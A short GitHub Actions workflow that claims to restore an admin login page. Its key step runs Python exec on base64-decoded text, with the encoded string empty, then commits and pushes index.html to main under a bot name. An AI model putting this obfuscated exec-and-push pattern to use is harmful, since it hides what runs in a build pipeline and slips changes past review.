name: PAIRA v19.6 admin panel

on:
  push:
    branches: [main]
    paths:
      - '.github/workflows/paira-v19-6-admin-panel.yml'

permissions:
  contents: write

jobs:
  patch-index:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Restore real admin login and dashboard
        shell: bash
        run: |
          python -c "import base64;exec(base64.b64decode(''))"

      - name: Commit admin panel
        shell: bash
        run: |
          git config user.name "PAIRA Hotfix Bot"
          git config user.email "actions@users.noreply.github.com"
          git add index.html
          git commit -m "Restore password admin dashboard"
          git push
